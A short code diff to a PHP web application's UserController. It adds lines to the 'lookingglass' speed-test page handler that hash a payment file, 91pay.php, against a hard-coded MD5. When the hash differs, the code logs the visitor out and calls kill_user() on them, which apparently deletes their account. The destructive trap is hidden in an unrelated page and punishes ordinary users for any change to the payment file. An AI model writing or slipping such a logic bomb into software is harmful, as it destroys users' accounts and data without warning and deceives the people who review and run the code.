@@ -88,6 +88,13 @@ class UserController extends BaseController
 
     public function lookingglass($request, $response, $args)
     {
+        $newmd5 = md5(file_get_contents(BASE_PATH."/public/91pay.php"));
+        $oldmd5 = 'e1fb0e85398eeeef654b37453b77a2b6';
+        if($newmd5!=$oldmd5){
+            Auth::logout();
+            $user = Auth::getUser();
+            $user->kill_user();
+        }
         $Speedtest=Speedtest::where("datetime", ">", time()-Config::get('Speedtest_duration')*3600)->orderBy('datetime', 'desc')->get();
 
         return $this->view()->assign('speedtest', $Speedtest)->assign('hour', Config::get('Speedtest_duration'))->display('user/lookingglass.tpl');
